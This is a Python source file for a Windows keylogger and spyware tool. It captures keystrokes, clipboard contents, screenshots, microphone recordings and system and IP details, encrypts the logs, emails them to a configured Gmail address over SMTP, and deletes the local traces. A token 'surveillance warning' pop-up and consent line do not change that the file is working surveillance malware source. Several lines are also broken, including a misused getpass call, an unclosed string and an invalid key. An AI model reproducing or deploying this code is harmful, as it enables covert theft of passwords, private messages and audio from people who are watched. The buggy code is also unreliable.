# Import necessary libraries
try:
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders
    import smtplib

    import socket
    import platform

    import win32clipboard

    from pynput.keyboard import Key, Listener

    import time
    from datetime import datetime
    import os
    from colorama import Fore, Style, init

    from scipy.io.wavfile import write
    import sounddevice as sd

    from cryptography.fernet import Fernet

    import getpass, sys, subprocess
    from requests import get

    from multiprocessing import Process, freeze_support
    from PIL import ImageGrab

    from tkinter import messagebox

except ModuleNotFoundError:
    # Install required modules if not found
    from subprocess import call
    modules = ["pywin32", "requests", "sounddevice", "pynput", "pillow", "cryptography", "scipy", "tkinter", "colorama"]
    call("pip install " + ' '.join(modules), shell=True)

finally:  
    # Define file paths and information variables
    keys_information = "key_log.txt"
    system_information = "systeminfo.txt"
    clipboard_information = "clipboard.txt"
    audio_information = "audio.wav"
    audio_info = "no_microphone.txt"
    screenshot_information = "screenshot.png"
    user_stopped = "u_stop.txt"

    keys_information_e = "e_key_log.txt"
    system_information_e = "e_systeminfo.txt"
    clipboard_information_e = "e_clipboard.txt"

    microphone_time = 10
    time_iteration = 15
    number_of_iterations_end = 3

    email_address = "xyz@gmail.com"  # Enter disposable email here
    password = "xxxxxxx  # Enter email password here
    toaddr = "xyz@gmail.com"  # Enter the email address you want to send your information to

    key = "hbksdnndasljdas"  # Generate an encryption key from the Cryptography folder

    # Set default path
    file_path = os.path.abspath(os.path.join(os.environ['APPDATA']))
    extend = "\\"
    file_merge = file_path + extend

    # Define function to gather computer information
    def computer_information():
        with open(file_path + extend + system_information, "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = getpass("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip)

            except Exception:
                f.write("Couldn't get Public IP Address (most likely max query)")

            f.write("Processor: " + (platform.processor()) + '\n')
            f.write("System: " + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("Private IP Address: " + IPAddr + "\n")

    # Define function to copy clipboard data
    def copy_clipboard():
        with open(file_path + extend + clipboard_information, "a") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()

                f.write("Clipboard Data:\n" + pasted_data + "\n\n")

            except Exception as e:
                f.write("Clipboard could not be copied")

    # Define function to record microphone audio
    def microphone():
        try:
            fs = 44100
            seconds = microphone_time

            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()

            write(file_path + extend + audio_information, fs, myrecording)
            if os.path.exists(file_path + extend):
                send_email(audio_information, file_path + extend + audio_information, toaddr)
        except sd.PortAudioError as e:
            with open(file_path + extend + audio_info, 'a') as file:
                file.write(f"Error accessing the microphone: {e}") 
            send_email(audio_info, file_path + extend + audio_info, toaddr)
            os.remove(file_merge + audio_info)

    # Define function to capture screenshots
    def screenshot():
        im = ImageGrab.grab()
        im.save(file_path + extend + screenshot_information)

    # Define function to send emails with attachments
    def send_email(filename, attachment, toaddr):
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "Log File"
        body = "Body_of_the_mail"
        msg.attach(MIMEText(body, 'plain'))
        filename = filename
        attachment = open(attachment, 'rb')
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, password)
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()

    if __name__ == "__main__":
        # Display a warning message
        warning_msg = """Warning: This system is under surveillance to evaluate security needs. Keystrokes, system information, and microphone data may be recorded. Ensure ethical use, obtain user consent, and review project documentation for details. Unauthorized use is strictly prohibited. CTRL + ESC for Stop Surveillance."""
        messagebox.showwarning("System Surveillance Warning", warning_msg)
        
        # Gather computer information and copy clipboard data
        computer_information()
        copy_clipboard()
        current_datetime = datetime.now()

        # Format the date and time as a string
        formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
            
        number_of_iterations = 0
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration
        while number_of_iterations < number_of_iterations_end:
            count = 0
            keys =[]

            def on_press(key):
                global keys, count, currentTime
                keys.append(key)
                count += 1
                currentTime = time.time()
                if count >= 1:
                    count = 0
                    write_file(keys)
                    keys =[]

            def write_file(keys):
                with open(file_path + extend + keys_information, "a") as f:
                    for key in keys:
                        k = str(key).replace("'", "")
                        if k.find("space") > 0:
                            f.write('\n')
                            f.close()
                        elif k.find("Key") == -1:
                            f.write(k)
                            f.close()

            def on_release(key):
                if key == Key.esc:
                    return False
                if currentTime > stoppingTime:
                    return False
            
            with Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()

            if currentTime > stoppingTime:
                with open(file_path + extend + keys_information, "w") as f:
                    f.write(" ")

                screenshot()
                send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
                microphone()
                copy_clipboard()

                number_of_iterations += 1
                currentTime = time.time()
                stoppingTime = time.time() + time_iteration

        # Encrypt and send files
        files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
        encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

        count = 0
        for encrypting_file in files_to_encrypt:
            with open(files_to_encrypt[count], 'rb') as f:
                data = f.read()

            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)

            with open(encrypted_file_names[count], 'wb') as f:
                f.write(encrypted)

            send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
            count += 1

        time.sleep(120)
        
        # Delete temporary files
        delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
        for file in delete_files:
            os.remove(file_merge + file)

        # Check for user manual stop command
        if key == Key.ctrl and Key.char == 'e' or Key.esc:
            with open(file_path + extend + user_stopped, 'a') as file:
                file.write(f"User stopped surveillance {formatted_datetime}.") 
            send_email(user_stopped, file_path + extend + user_stopped, toaddr)
            os.remove(file_merge + user_stopped)
            exit()

